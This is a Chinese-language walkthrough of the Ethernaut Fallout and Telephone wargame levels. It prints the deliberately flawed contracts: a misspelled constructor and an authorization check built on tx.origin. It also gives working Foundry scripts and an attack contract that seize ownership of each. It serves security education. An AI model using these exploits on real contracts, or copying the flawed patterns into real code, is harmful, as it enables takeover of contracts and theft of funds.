# Ethernaut 第 2 关和第 4 关攻略

本文讲解 Ethernaut 第 2 关（Fallout）和第 4 关（Telephone）的解题思路和实现方法。

---

## 第 2 关：Fallout

### 漏洞分析

这一关的漏洞非常简单，主要考察构造函数（constructor）的正确写法。

#### 目标合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

#### 漏洞说明

**关键问题**：构造函数名称拼写错误！

- 合约名称是 `Fallout`
- 但构造函数写成了 `Fal1out()`（注意是数字 `1` 而不是字母 `l`）

在 Solidity 0.6.0 版本中，构造函数可以使用与合约同名的函数来定义。由于拼写错误，`Fal1out()` 变成了一个普通的公开函数，而不是构造函数。这意味着：

- 任何人都可以调用 `Fal1out()` 函数
- 每次调用都会将 `owner` 设置为调用者

### 攻击实现

直接编写攻击脚本，无需编写测试。

#### 攻击脚本

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/fallout.sol";

contract falloutScript is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address falloutAddress = 0x39E9593999295aAFCA6a0BC7FdA1a04E4aF722bc;

        Fallout level = Fallout(payable(falloutAddress));

        vm.startBroadcast(privateKey);

        level.Fal1out();

        console.log("Attack successful, new owner is:", level.owner());

        vm.stopBroadcast();
    }
}
```

#### 攻击步骤

只需调用一次 `Fal1out()` 函数，即可成为合约的 `owner`。非常简单，不过多赘述。

---

## 第 4 关：Telephone

### 漏洞分析

这一关主要考察 `tx.origin` 和 `msg.sender` 的区别。

#### 目标合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

#### 漏洞说明

目标是获得合约的所有权（ownership）。

观察 `changeOwner()` 函数，只要满足 `tx.origin != msg.sender` 条件，就可以修改 `owner`。

**关键概念**：

- `tx.origin`：交易的原始发起者（即用户钱包地址）
- `msg.sender`：当前调用者（可以是用户地址或合约地址）

**攻击思路**：

如果我们通过一个中间合约来调用 `changeOwner()`：

- `tx.origin` = 我们的钱包地址
- `msg.sender` = 中间合约地址

这样就满足了 `tx.origin != msg.sender` 的条件，`owner` 就会被设置为我们传入的地址。

### 攻击实现

#### 步骤 1：编写攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "../src/Telephone.sol";

contract teleAttack {
    constructor() {
    }

    function attack(address telephone) public {
        Telephone tele = Telephone(telephone);
        tele.changeOwner(msg.sender);
    }
}
```

**说明**：

- 这是最简单的构造，只写一个 `attack()` 函数
- 该函数调用目标合约的 `changeOwner()`，并将 `msg.sender`（即我们的钱包地址）作为新的 `owner`

#### 步骤 2：部署攻击合约

将 `teleAttack` 合约部署到链上。

#### 步骤 3：编写 Foundry 脚本调用攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";
import "../src/teleAttack.sol";

contract telephoneScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address teleAddress = 0x6eB223d090aa01baA0F81D6Bd7c9c61bBbc579d3;
        address teleSend = 0x61eF3115De6e61C3F4ab3dF3f8545c9617CaAa20;

        vm.startBroadcast(privateKey);

        teleAttack telA = teleAttack(teleSend);
        telA.attack(teleAddress);

        Telephone tele = Telephone(teleAddress);
        console.log("Success! owner", tele.owner());

        vm.stopBroadcast();
    }
}
```

**说明**：

- 调用已部署的 `teleAttack` 合约
- 通过 `attack()` 函数完成攻击
- 验证 `owner` 是否已更改

---

## 总结

今天这两关主要考察的是：

1. **构造函数的正确写法**（第 2 关）
   - 在 Solidity 0.6.0 及之前版本，构造函数名称必须与合约名称完全一致
   - 从 Solidity 0.7.0 开始，推荐使用 `constructor` 关键字

2. **`tx.origin` vs `msg.sender` 的区别**（第 4 关）
   - `tx.origin` 是交易的原始发起者
   - `msg.sender` 是当前调用者
   - 使用 `tx.origin` 进行权限验证存在安全隐患

> [!WARNING]
> 编写智能合约时一定要细心，任何小的疏忽都可能酿成大错，导致严重的安全漏洞！


































